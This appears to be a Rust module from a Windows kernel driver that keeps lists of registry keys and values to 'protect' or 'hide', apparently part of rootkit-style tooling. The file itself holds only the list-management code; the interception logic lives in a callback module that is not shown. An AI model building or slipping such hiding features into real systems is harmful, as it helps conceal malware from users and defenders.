use wdk_sys::{NTSTATUS, STATUS_DUPLICATE_OBJECTID, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
use spin::{lazy::Lazy, Mutex, MutexGuard};
use alloc::{
    string::{String, ToString},
    vec::Vec,
};

use common::structs::TargetRegistry;
use core::marker::PhantomData;

/// Callback module
pub mod callback;

/// Utility functions
mod utils;
pub use utils::*;

/// Max Number Registry
const MAX_REGISTRY: usize = 100;

/// List of protection key-value pairs.
///
/// This list stores key-value pairs that are protected.
/// It is guarded by a mutex to ensure thread-safe access.
pub static PROTECTION_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> =
    Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_REGISTRY)));

/// List of protection keys.
///
/// This list stores keys that are protected. It is guarded by a mutex to ensure thread-safe access.
static PROTECTION_KEYS: Lazy<Mutex<Vec<String>>> =
    Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_REGISTRY)));

/// List of hidden keys.
///
/// This list stores keys that have been hidden. It is protected by a mutex for thread-safe operations.
static HIDE_KEYS: Lazy<Mutex<Vec<String>>> =
    Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_REGISTRY)));

/// List of hidden key-value pairs.
///
/// This list stores key-value pairs that have been hidden. It is protected by a mutex for thread-safe operations.
static HIDE_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> =
    Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_REGISTRY)));

/// Trait defining common operations for registry lists.
///
/// This trait provides methods for adding, removing, and checking items in registry lists.
trait RegistryList<T> {
    /// Adds an item to the registry list.
    ///
    /// # Arguments
    ///
    /// * `list` - A mutable reference to the list.
    /// * `item` - The item to be added.
    ///
    /// # Returns
    ///
    /// * Status code indicating success (`STATUS_SUCCESS`), duplicate (`STATUS_DUPLICATE_OBJECTID`),
    ///   or failure (`STATUS_UNSUCCESSFUL`).
    fn add_item(list: &mut Vec<T>, item: T) -> NTSTATUS;

    /// Removes an item from the registry list.
    ///
    /// # Arguments
    ///
    /// * `list` - A mutable reference to the list.
    /// * `item` - The item to be removed.
    ///
    /// # Returns
    ///
    /// * Status code indicating success (`STATUS_SUCCESS`) or failure (`STATUS_UNSUCCESSFUL`).
    fn remove_item(list: &mut Vec<T>, item: &T) -> NTSTATUS;

    /// Checks if an item is in the registry list.
    ///
    /// # Arguments
    ///
    /// * `list` - A reference to the list.
    /// * `item` - The item to be checked.
    ///
    /// # Returns
    ///
    /// * Returns `true` if the item is in the list, `false` otherwise.
    fn contains_item(list: &Vec<T>, item: &T) -> bool;
}

/// Implementation of `RegistryList` for key-value pairs.
impl RegistryList<(String, String)> for Vec<(String, String)> {
    fn add_item(list: &mut Vec<(String, String)>, item: (String, String)) -> NTSTATUS {
        if list.len() >= MAX_REGISTRY {
            return STATUS_UNSUCCESSFUL;
        }

        if list.iter().any(|(k, v)| k == &item.0 && v == &item.1) {
            return STATUS_DUPLICATE_OBJECTID;
        }

        list.push(item);
        STATUS_SUCCESS
    }

    fn remove_item(list: &mut Vec<(String, String)>, item: &(String, String)) -> NTSTATUS {
        if let Some(index) = list.iter().position(|(k, v)| k == &item.0 && v == &item.1) {
            list.remove(index);
            STATUS_SUCCESS
        } else {
            STATUS_UNSUCCESSFUL
        }
    }

    fn contains_item(list: &Vec<(String, String)>, item: &(String, String)) -> bool {
        list.contains(item)
    }
}

/// Implementation of `RegistryList` for strings.
impl RegistryList<String> for Vec<String> {
    fn add_item(list: &mut Vec<String>, item: String) -> NTSTATUS {
        if list.len() >= MAX_REGISTRY {
            return STATUS_UNSUCCESSFUL;
        }

        if list.contains(&item) {
            return STATUS_DUPLICATE_OBJECTID;
        }

        list.push(item);
        STATUS_SUCCESS
    }

    fn remove_item(list: &mut Vec<String>, item: &String) -> NTSTATUS {
        if let Some(index) = list.iter().position(|k| k == item) {
            list.remove(index);
            STATUS_SUCCESS
        } else {
            STATUS_UNSUCCESSFUL
        }
    }

    fn contains_item(list: &Vec<String>, item: &String) -> bool {
        list.contains(item)
    }
}

/// Structure representing registry operations.
///
/// The `Registry<T>` structure handles operations for adding, removing, and checking keys or key-value pairs
/// in the registry.
pub struct Registry<T> {
    _marker: PhantomData<T>,
}

impl Registry<(String, String)> {
    /// Adds or removes a key-value pair from the list of protected or hidden values.
    ///
    /// # Arguments
    ///
    /// * `target` - A pointer to a `TargetRegistry` structure representing the key-value pair.
    /// * `type_` - An enum indicating whether to protect or hide the key-value pair.
    ///
    /// # Returns
    ///
    /// * Status code indicating success (`STATUS_SUCCESS`) or failure (`STATUS_UNSUCCESSFUL`).
    pub fn modify_key_value(target: *mut TargetRegistry, type_: Type) -> NTSTATUS {
        let key = unsafe { (*target).key.clone() };
        let value = unsafe { (*target).value.clone() };
        let enable = unsafe { (*target).enable };

        let status = match type_ {
            Type::Protect => {
                let mut list = PROTECTION_KEY_VALUES.lock();
                if enable {
                    Vec::<(String, String)>::add_item(&mut list, (key, value))
                } else {
                    Vec::<(String, String)>::remove_item(&mut list, &(key, value))
                }
            }
            Type::Hide => {
                let mut list = HIDE_KEY_VALUES.lock();
                if enable {
                    Vec::<(String, String)>::add_item(&mut list, (key, value))
                } else {
                    Vec::<(String, String)>::remove_item(&mut list, &(key, value))
                }
            }
        };

        status
    }

    /// Checks if a key-value pair exists in the list of protected values.
    ///
    /// # Arguments
    ///
    /// * `key` - The key to check.
    /// * `value` - The value to check.
    /// * `list` - A guard that provides access to the list.
    ///
    /// # Returns
    ///
    /// * Returns `true` if the key-value pair exists in the list, or `false` otherwise.
    pub fn check_target(
        key: String,
        value: String,
        list: MutexGuard<Vec<(String, String)>>,
    ) -> bool {
        Vec::<(String, String)>::contains_item(&list, &(key, value))
    }
}

impl Registry<String> {
    /// Adds or removes a key from the list of protected or hidden keys.
    ///
    /// # Arguments
    ///
    /// * `target` - A pointer to a `TargetRegistry` structure representing the key.
    /// * `list_type` - An enum indicating whether to protect or hide the key.
    ///
    /// # Returns
    ///
    /// * Status code indicating success (`STATUS_SUCCESS`) or failure (`STATUS_UNSUCCESSFUL`).
    pub fn modify_key(target: *mut TargetRegistry, list_type: Type) -> NTSTATUS {
        let key = unsafe { &(*target).key }.to_string();
        let enable = unsafe { (*target).enable };

        let status = match list_type {
            Type::Protect => {
                let mut list = PROTECTION_KEYS.lock();
                if enable {
                    Vec::add_item(&mut list, key)
                } else {
                    Vec::remove_item(&mut list, &key)
                }
            }
            Type::Hide => {
                let mut list = HIDE_KEYS.lock();
                if enable {
                    Vec::add_item(&mut list, key)
                } else {
                    Vec::remove_item(&mut list, &key)
                }
            }
        };

        status
    }

    /// Checks if a key exists in the list of protected keys.
    ///
    /// # Arguments
    ///
    /// * `key` - The key to check.
    /// * `list` - A guard that provides access to the list.
    ///
    /// # Returns
    ///
    /// * Returns `true` if the key exists in the list, or `false` otherwise.
    pub fn check_key(key: String, list: MutexGuard<Vec<String>>) -> bool {
        Vec::contains_item(&list, &key)
    }
}
